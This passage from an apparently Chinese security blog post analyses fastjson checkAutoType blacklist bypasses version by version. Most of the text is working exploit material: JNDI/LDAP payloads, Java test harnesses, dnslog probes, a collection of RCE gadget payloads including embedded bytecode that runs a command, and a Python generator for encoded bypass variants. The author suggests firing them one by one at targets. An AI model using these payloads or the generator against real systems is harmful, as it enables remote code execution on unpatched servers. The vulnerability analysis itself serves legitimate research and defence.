}\n\n        // 位置2，从已存在的map中获取clazz\n        Class&#38;lt;?&#38;gt; clazz = TypeUtils.getClassFromMapping(typeName);\n        if (clazz == null) {\n            clazz = deserializers.findClass(typeName);\n        }\n\n        if (clazz != null) {\n            if (expectClass != null &#38;amp;&#38;amp; !expectClass.isAssignableFrom(clazz)) {\n                throw new JSONException(&#34;type not match. &#34; + typeName + &#34; -&#38;gt; &#34; + expectClass.getName());\n            }\n\n            return clazz;\n        }\n\n        // 位置3，没开启autoTypeSupport，依然会进行黑白名单检测，先黑名单，再白名单\n        if (!autoTypeSupport) {\n            for (int i = 0; i &#38;lt; denyList.length; ++i) {\n                String deny = denyList[i];\n                if (className.startsWith(deny)) {\n                    throw new JSONException(&#34;autoType is not support. &#34; + typeName);\n                }\n            }\n            for (int i = 0; i &#38;lt; acceptList.length; ++i) {\n                String accept = acceptList[i];\n                if (className.startsWith(accept)) {\n                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);\n\n                    if (expectClass != null &#38;amp;&#38;amp; expectClass.isAssignableFrom(clazz)) {\n                        throw new JSONException(&#34;type not match. &#34; + typeName + &#34; -&#38;gt; &#34; + expectClass.getName());\n                    }\n                    return clazz;\n                }\n            }\n        }\n\n        // 位置4，过了黑白名单，autoTypeSupport开启，就加载目标类\n        if (autoTypeSupport || expectClass != null) {\n            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);\n        }\n\n        if (clazz != null) {\n            // ClassLoader、DataSource子类/子接口检测\n            if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger\n                    || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver\n                    ) {\n                throw new JSONException(&#34;autoType is not support. &#34; + typeName);\n            }\n\n            if (expectClass != null) {\n                if (expectClass.isAssignableFrom(clazz)) {\n                    return clazz;\n                } else {\n                    throw new JSONException(&#34;type not match. &#34; + typeName + &#34; -&#38;gt; &#34; + expectClass.getName());\n                }\n            }\n        }\n\n        if (!autoTypeSupport) {\n            throw new JSONException(&#34;autoType is not support. &#34; + typeName);\n        }\n\n        return clazz;\n    }</pre>\n\n\n\n<p>在上面做了四个位置标记，因为后面几次绕过也与这几处位置有关。这一次的绕过是走过了前面的1，2，3成功进入位置4加载目标类。位置4 loadclass如下：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/d466118d-e01a-45ba-b2f9-c2b5d345c8f8.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>去掉了className前后的<code>L</code>和<code>;</code>，形如<code>Lcom.lang.Thread;</code>这种表示方法和JVM中类的表示方法是类似的，fastjson对这种表示方式做了处理。而之前的黑名单检测都是startswith检测的，所以可给@type指定的类前后加上<code>L</code>和<code>;</code>来绕过黑名单检测。</p>\n\n\n\n<p>这里用上面的JdbcRowSetImpl利用链：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">{\n  &#34;rand1&#34;: {\n    &#34;@type&#34;: &#34;Lcom.sun.rowset.JdbcRowSetImpl;&#34;,\n    &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;,\n    &#34;autoCommit&#34;: true\n  }\n}</pre>\n\n\n\n<p>测试（jdk8u102，fastjson 1.2.41）：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">package com.longofo.test;\n\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.ParserConfig;\n\npublic class Test4 {\n    public static void main(String[] args) {\n        String payload = &#34;{\\&#34;rand1\\&#34;:{\\&#34;@type\\&#34;:\\&#34;Lcom.sun.rowset.JdbcRowSetImpl;\\&#34;,\\&#34;dataSourceName\\&#34;:\\&#34;ldap://localhost:1389/Object\\&#34;,\\&#34;autoCommit\\&#34;:true}}&#34;;\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n        //JSON.parse(payload); 成功\n        //JSON.parseObject(payload); 成功\n        //JSON.parseObject(payload,Object.class); 成功\n        //JSON.parseObject(payload, User.class); 成功\n    }\n}</pre>\n\n\n\n<p>结果：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/2c1569a3-1e83-4e1c-9320-3aa08564caae.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h5 id=\"ver1242\">ver=1.2.42</h5>\n\n\n\n<p>在1.2.42对1.2.25~1.2.41的checkAutotype绕过进行了修复，将黑名单改成了十进制，对checkAutotype检测也做了相应变化：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/4004f4d6-92f8-4358-8357-8ec4cccddbb1.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/2e0a0eff-dc21-4add-a381-045f4b7751ec.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>黑名单改成了十进制，检测也进行了相应hash运算。不过和上面1.2.25中的检测过程还是一致的，只是把startswith这种检测换成了hash运算这种检测。对于1.2.25~1.2.41的checkAutotype绕过的修复，就是红框处，判断了className前后是不是<code>L</code>和<code>;</code>，如果是，就截取第二个字符和到倒数第二个字符。所以1.2.42版本的checkAutotype绕过就是前后双写<code>LL</code>和<code>;;</code>，截取之后过程就和1.2.25~1.2.41版本利用方式一样了。</p>\n\n\n\n<p>用上面的JdbcRowSetImpl利用链：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">{\n  &#34;rand1&#34;: {\n    &#34;@type&#34;: &#34;LLcom.sun.rowset.JdbcRowSetImpl;;&#34;,\n    &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;,\n    &#34;autoCommit&#34;: true\n  }\n}</pre>\n\n\n\n<p>测试（jdk8u102，fastjson 1.2.42）:</p>\n\n\n\n<pre class=\"crayon-plain-tag\">package com.longofo.test;\n\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.ParserConfig;\n\npublic class Test5 {\n    public static void main(String[] args) {\n        String payload = &#34;{\\&#34;rand1\\&#34;:{\\&#34;@type\\&#34;:\\&#34;LLcom.sun.rowset.JdbcRowSetImpl;;\\&#34;,\\&#34;dataSourceName\\&#34;:\\&#34;ldap://localhost:1389/Object\\&#34;,\\&#34;autoCommit\\&#34;:true}}&#34;;\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n        //JSON.parse(payload); 成功\n        //JSON.parseObject(payload); 成功\n        //JSON.parseObject(payload,Object.class); 成功\n        //JSON.parseObject(payload, User.class); 成功\n    }\n}</pre>\n\n\n\n<p>结果：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/d08e30b6-79fb-4eda-842e-57e40d18e066.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h5 id=\"ver1243\">ver=1.2.43</h5>\n\n\n\n<p>1.2.43对于1.2.42的绕过修复方式：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/c7198bce-44be-46eb-9a02-6f1bcd0badbc.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在第一个if条件之下（<code>L</code>开头，<code>;</code>结尾），又加了一个以<code>LL</code>开头的条件，如果第一个条件满足并且以<code>LL</code>开头，直接抛异常。所以这种修复方式没法在绕过了。但是上面的loadclass除了<code>L</code>和<code>;</code>做了特殊处理外，<code>[</code>也被特殊处理了，又再次绕过了checkAutoType：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/bb4276d2-ff2f-4f7c-95ed-27530edfb9ba.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>用上面的JdbcRowSetImpl利用链：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">{&#34;rand1&#34;:{&#34;@type&#34;:&#34;[com.sun.rowset.JdbcRowSetImpl&#34;[{&#34;dataSourceName&#34;:&#34;ldap://127.0.0.1:1389/Exploit&#34;,&#34;autoCommit&#34;:true]}}</pre>\n\n\n\n<p>测试（jdk8u102，fastjson 1.2.43）:</p>\n\n\n\n<pre class=\"crayon-plain-tag\">package com.longofo.test;\n\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.ParserConfig;\n\npublic class Test6 {\n    public static void main(String[] args) {\n        String payload = &#34;{\\&#34;rand1\\&#34;:{\\&#34;@type\\&#34;:\\&#34;[com.sun.rowset.JdbcRowSetImpl\\&#34;[{\\&#34;dataSourceName\\&#34;:\\&#34;ldap://127.0.0.1:1389/Exploit\\&#34;,\\&#34;autoCommit\\&#34;:true]}}&#34;;\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n//        JSON.parse(payload); 成功\n        //JSON.parseObject(payload); 成功\n        //JSON.parseObject(payload,Object.class); 成功\n        JSON.parseObject(payload, User.class);\n    }\n}</pre>\n\n\n\n<p>结果：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/9821afb8-49b0-4b7a-a480-32d5d8488e56.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h5 id=\"ver1244\">ver=1.2.44</h5>\n\n\n\n<p>1.2.44版本修复了1.2.43绕过，处理了<code>[</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/f0846877-c8cb-464d-a230-4897773c3676.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>删除了之前的<code>L</code>开头、<code>;</code>结尾、<code>LL</code>开头的判断，改成了<code>[</code>开头就抛异常，<code>;</code>结尾也抛异常，所以这样写之前的几次绕过都修复了。</p>\n\n\n\n<h5 id=\"ver1245ver1246\"><code>ver&#62;=1.2.45&#38;ver&#60;1.2.46</code></h5>\n\n\n\n<p>这两个版本期间就是增加黑名单，没有发生checkAutotype绕过。黑名单中有几个payload在后面的RCE Payload给出，这里就不写了</p>\n\n\n\n<h5 id=\"ver1247\">ver=1.2.47</h5>\n\n\n\n<p>这个版本发生了不开启autotype情况下能利用成功的绕过。解析一下这次的绕过：</p>\n\n\n\n<ol><li>利用到了<code>java.lang.class</code>，这个类不在黑名单，所以checkAutotype可以过</li><li>这个<code>java.lang.class</code>类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中</li><li>如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回</li></ol>\n\n\n\n<p>这个漏洞分析已经很多了，具体详情可以参考下<a href=\"http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#v1-2-47\">这篇</a></p>\n\n\n\n<p>payload：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">{\n    &#34;rand1&#34;: {\n        &#34;@type&#34;: &#34;java.lang.Class&#34;, \n        &#34;val&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;\n    }, \n    &#34;rand2&#34;: {\n        &#34;@type&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;, \n        &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;, \n        &#34;autoCommit&#34;: true\n    }\n}</pre>\n\n\n\n<p>测试（jdk8u102，fastjson 1.2.47）：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">package com.longofo.test;\n\nimport com.alibaba.fastjson.JSON;\n\npublic class Test7 {\n    public static void main(String[] args) {\n        String payload = &#34;{\\n&#34; +\n                &#34;    \\&#34;rand1\\&#34;: {\\n&#34; +\n                &#34;        \\&#34;@type\\&#34;: \\&#34;java.lang.Class\\&#34;, \\n&#34; +\n                &#34;        \\&#34;val\\&#34;: \\&#34;com.sun.rowset.JdbcRowSetImpl\\&#34;\\n&#34; +\n                &#34;    }, \\n&#34; +\n                &#34;    \\&#34;rand2\\&#34;: {\\n&#34; +\n                &#34;        \\&#34;@type\\&#34;: \\&#34;com.sun.rowset.JdbcRowSetImpl\\&#34;, \\n&#34; +\n                &#34;        \\&#34;dataSourceName\\&#34;: \\&#34;ldap://localhost:1389/Object\\&#34;, \\n&#34; +\n                &#34;        \\&#34;autoCommit\\&#34;: true\\n&#34; +\n                &#34;    }\\n&#34; +\n                &#34;}&#34;;\n        //JSON.parse(payload); 成功\n        //JSON.parseObject(payload); 成功\n        //JSON.parseObject(payload,Object.class); 成功\n        JSON.parseObject(payload, User.class);\n    }\n}</pre>\n\n\n\n<p>结果：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/e23f4b42-04d2-4360-802e-84d4390eab2d.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h5 id=\"ver1248ver1268\">ver&#62;=1.2.48&#38;ver&#60;=1.2.68</h5>\n\n\n\n<p>在1.2.48修复了1.2.47的绕过，在MiscCodec，处理Class类的地方，设置了cache为false：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/8c8e7426-63bd-440c-b502-4e435fba6752.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在1.2.48到最新版本1.2.68之间，都是增加黑名单类。</p>\n\n\n\n<h5 id=\"ver1268\">ver=1.2.68</h5>\n\n\n\n<p>1.2.68是目前最新版，在1.2.68引入了safemode，打开safemode时，@type这个specialkey完全无用，无论白名单和黑名单，都不支持autoType了。</p>\n\n\n\n<p>在这个版本中，除了增加黑名单，还减掉一个黑名单：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/607c76f3-3d03-471f-89df-8da048f42985.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>这个减掉的黑名单，不知道有师傅跑出来没，是个包名还是类名，然后能不能用于恶意利用，反正有点奇怪。</p>\n\n\n\n<h4 id=\"fastjson_3\">探测Fastjson</h4>\n\n\n\n<p>比较常用的探测Fastjson是用dnslog方式，探测到了再用RCE Payload去一个一个打。同事说让搞个能回显的放扫描器扫描，不过目标容器/框架不一样，回显方式也会不一样，这有点为难了...，还是用dnslog吧。</p>\n\n\n\n<h5 id=\"dnslog\">dnslog探测</h5>\n\n\n\n<p>目前fastjson探测比较通用的就是dnslog方式去探测，其中Inet4Address、Inet6Address直到1.2.67都可用。下面给出一些看到的payload（结合了上面的rand:{}这种方式，比较通用些）：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">{&#34;rand1&#34;:{&#34;@type&#34;:&#34;java.net.InetAddress&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}}\n\n{&#34;rand2&#34;:{&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}}\n\n{&#34;rand3&#34;:{&#34;@type&#34;:&#34;java.net.Inet6Address&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}}\n\n{&#34;rand4&#34;:{&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;:&#34;http://dnslog&#34;}}}\n\n{&#34;rand5&#34;:{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}}\n\n\n一些畸形payload，不过依然可以触发dnslog：\n{&#34;rand6&#34;:{&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;, {&#34;@type&#34;: &#34;java.net.URL&#34;, &#34;val&#34;:&#34;http://dnslog&#34;}}&#34;&#34;}}\n\n{&#34;rand7&#34;:Set[{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}]}\n\n{&#34;rand8&#34;:Set[{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}\n\n{&#34;rand9&#34;:{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://dnslog&#34;}:0</pre>\n\n\n\n<h4 id=\"rce-payload\">一些RCE Payload</h4>\n\n\n\n<p>之前没有收集关于fastjson的payload，没有去跑jar包....，下面列出了网络上流传的payload以及从marshalsec中扣了一些并改造成适用于fastjson的payload，每个payload适用的jdk版本、fastjson版本就不一一测试写了，这一通测下来都不知道要花多少时间，实际利用基本无法知道版本、autotype开了没、用户咋配置的、用户自己设置又加了黑名单/白名单没，所以将构造的Payload一一过去打就行了，基础payload：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">payload1:\n{\n  &#34;rand1&#34;: {\n    &#34;@type&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;,\n    &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;,\n    &#34;autoCommit&#34;: true\n  }\n}\n\n\npayload2:\n{\n  &#34;rand1&#34;: {\n    &#34;@type&#34;: &#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;,\n    &#34;_bytecodes&#34;: [\n      &#34;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ&#34;\n    ],\n    &#34;_name&#34;: &#34;aaa&#34;,\n    &#34;_tfactory&#34;: {},\n    &#34;_outputProperties&#34;: {}\n  }\n}\n\n\npayload3:\n{\n  &#34;rand1&#34;: {\n    &#34;@type&#34;: &#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&#34;,\n    &#34;properties&#34;: {\n      &#34;data_source&#34;: &#34;ldap://localhost:1389/Object&#34;\n    }\n  }\n}\n\npayload4:\n{\n  &#34;rand1&#34;: {\n    &#34;@type&#34;: &#34;org.springframework.beans.factory.config.PropertyPathFactoryBean&#34;,\n    &#34;targetBeanName&#34;: &#34;ldap://localhost:1389/Object&#34;,\n    &#34;propertyPath&#34;: &#34;foo&#34;,\n    &#34;beanFactory&#34;: {\n      &#34;@type&#34;: &#34;org.springframework.jndi.support.SimpleJndiBeanFactory&#34;,\n      &#34;shareableResources&#34;: [\n        &#34;ldap://localhost:1389/Object&#34;\n      ]\n    }\n  }\n}\n\npayload5:\n{\n  &#34;rand1&#34;: Set[\n  {\n    &#34;@type&#34;: &#34;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&#34;,\n    &#34;beanFactory&#34;: {\n      &#34;@type&#34;: &#34;org.springframework.jndi.support.SimpleJndiBeanFactory&#34;,\n      &#34;shareableResources&#34;: [\n        &#34;ldap://localhost:1389/obj&#34;\n      ]\n    },\n    &#34;adviceBeanName&#34;: &#34;ldap://localhost:1389/obj&#34;\n  },\n  {\n    &#34;@type&#34;: &#34;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&#34;\n  }\n]}\n\npayload6:\n{\n  &#34;rand1&#34;: {\n    &#34;@type&#34;: &#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;,\n    &#34;userOverridesAsString&#34;: &#34;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;&#34;\n  }\n}\n\npayload7:\n{\n  &#34;rand1&#34;: {\n    &#34;@type&#34;: &#34;com.mchange.v2.c3p0.JndiRefForwardingDataSource&#34;,\n    &#34;jndiName&#34;: &#34;ldap://localhost:1389/Object&#34;,\n    &#34;loginTimeout&#34;: 0\n  }\n}\n\n\n...还有很多</pre>\n\n\n\n<p>下面是个小脚本，可以将基础payload转出各种绕过的变形态，还增加了<code>\\u</code>、<code>\\x</code>编码形式：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">#!usr/bin/env python  \n# -*- coding:utf-8 -*-\n&#34;&#34;&#34; \n@author: longofo\n@file: fastjson_fuzz.py \n@time: 2020/05/07 \n&#34;&#34;&#34;\nimport json\nfrom json import JSONDecodeError\n\n\nclass FastJsonPayload:\n    def __init__(self, base_payload):\n        try:\n            json.loads(base_payload)\n        except JSONDecodeError as ex:\n            raise ex\n        self.base_payload = base_payload\n\n    def gen_common(self, payload, func):\n        tmp_payload = json.loads(payload)\n        dct_objs = [tmp_payload]\n\n        while len(dct_objs) &#38;gt; 0:\n            tmp_objs = []\n            for dct_obj in dct_objs:\n                for key in dct_obj:\n                    if key == &#34;@type&#34;:\n                        dct_obj[key] = func(dct_obj[key])\n\n                    if type(dct_obj[key]) == dict:\n                        tmp_objs.append(dct_obj[key])\n            dct_objs = tmp_objs\n        return json.dumps(tmp_payload)\n\n    # 对@type的value增加L开头，;结尾的payload\n    def gen_payload1(self, payload: str):\n        return self.gen_common(payload, lambda v: &#34;L&#34; + v + &#34;;&#34;)\n\n    # 对@type的value增加LL开头，;;结尾的payload\n    def gen_payload2(self, payload: str):\n        return self.gen_common(payload, lambda v: &#34;LL&#34; + v + &#34;;;&#34;)\n\n    # 对@type的value进行\\u\n    def gen_payload3(self, payload: str):\n        return self.gen_common(payload,\n                               lambda v: ''.join('\\\\u{:04x}'.format(c) for c in v.encode())).replace(&#34;\\\\\\\\&#34;, &#34;\\\\&#34;)\n\n    # 对@type的value进行\\x\n    def gen_payload4(self, payload: str):\n        return self.gen_common(payload,\n                               lambda v: ''.join('\\\\x{:02x}'.format(c) for c in v.encode())).replace(&#34;\\\\\\\\&#34;, &#34;\\\\&#34;)\n\n    # 生成cache绕过payload\n    def gen_payload5(self, payload: str):\n        cache_payload = {\n            &#34;rand1&#34;: {\n                &#34;@type&#34;: &#34;java.lang.Class&#34;,\n                &#34;val&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;\n            }\n        }\n        cache_payload[&#34;rand2&#34;] = json.loads(payload)\n        return json.dumps(cache_payload)\n\n    def gen(self):\n        payloads = []\n\n        payload1 = self.gen_payload1(self.base_payload)\n        yield payload1\n\n        payload2 = self.gen_payload2(self.base_payload)\n        yield payload2\n\n        payload3 = self.gen_payload3(self.base_payload)\n        yield payload3\n\n        payload4 = self.gen_payload4(self.base_payload)\n        yield payload4\n\n        payload5 = self.gen_payload5(self.base_payload)\n        yield payload5\n\n        payloads.append(payload1)\n        payloads.append(payload2)\n        payloads.append(payload5)\n\n        for payload in payloads:\n            yield self.gen_payload3(payload)\n            yield self.gen_payload4(payload)\n\n\nif __name__ == '__main__':\n    fjp = FastJsonPayload('''{\n  &#34;rand1&#34;: {\n    &#34;@type&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;,\n    &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;,\n    &#34;autoCommit&#34;: true\n  }\n}''')\n\n    for payload in fjp.gen():\n        print(payload)\n        print()</pre>\n\n\n\n<p>例如JdbcRowSetImpl结果：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">{&#34;rand1&#34;: {&#34;@type&#34;: &#34;Lcom.sun.rowset.JdbcRowSetImpl;&#34;, &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;, &#34;autoCommit&#34;: true}}\n\n{&#34;rand1&#34;: {&#34;@type&#34;: &#34;LLcom.sun.rowset.JdbcRowSetImpl;;&#34;, &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;, &#34;autoCommit&#34;: true}}\n\n{&#34;rand1&#34;: {&#34;@type&#34;: &#34;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&#34;, &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;, &#34;autoCommit&#34;: true}}\n\n{&#34;rand1&#34;: {&#34;@type&#34;: &#34;\\x63\\x6f\\x6d\\x2e\\x73\\x75\\x6e\\x2e\\x72\\x6f\\x77\\x73\\x65\\x74\\x2e\\x4a\\x64\\x62\\x63\\x52\\x6f\\x77\\x53\\x65\\x74\\x49\\x6d\\x70\\x6c&#34;, &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;, &#34;autoCommit&#34;: true}}\n\n{&#34;rand1&#34;: {&#34;@type&#34;: &#34;java.lang.Class&#34;, &#34;val&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;}, &#34;rand2&#34;: {&#34;rand1&#34;: {&#34;@type&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;, &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;, &#34;autoCommit&#34;: true}}}\n\n{&#34;rand1&#34;: {&#34;@type&#34;: &#34;\\u004c\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\\u003b&#34;, &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;, &#34;autoCommit&#34;: true}}\n\n{&#34;rand1&#34;: {&#34;@type&#34;: &#34;\\x4c\\x63\\x6f\\x6d\\x2e\\x73\\x75\\x6e\\x2e\\x72\\x6f\\x77\\x73\\x65\\x74\\x2e\\x4a\\x64\\x62\\x63\\x52\\x6f\\x77\\x53\\x65\\x74\\x49\\x6d\\x70\\x6c\\x3b&#34;, &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;, &#34;autoCommit&#34;: true}}\n\n{&#34;rand1&#34;: {&#34;@type&#34;: &#34;\\u004c\\u004c\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\\u003b\\u003b&#34;, &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;, &#34;autoCommit&#34;: true}}\n\n{&#34;rand1&#34;: {&#34;@type&#34;: &#34;\\x4c\\x4c\\x63\\x6f\\x6d\\x2e\\x73\\x75\\x6e\\x2e\\x72\\x6f\\x77\\x73\\x65\\x74\\x2e\\x4a\\x64\\x62\\x63\\x52\\x6f\\x77\\x53\\x65\\x74\\x49\\x6d\\x70\\x6c\\x3b\\x3b&#34;, &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;, &#34;autoCommit&#34;: true}}\n\n{&#34;rand1&#34;: {&#34;@type&#34;: &#34;\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073&#34;, &#34;val&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;}, &#34;rand2&#34;: {&#34;rand1&#34;: {&#34;@type&#34;: &#34;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&#34;, &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;, &#34;autoCommit&#34;: true}}}\n\n{&#34;rand1&#34;: {&#34;@type&#34;: &#34;\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x43\\x6c\\x61\\x73\\x73&#34;, &#34;val&#34;: 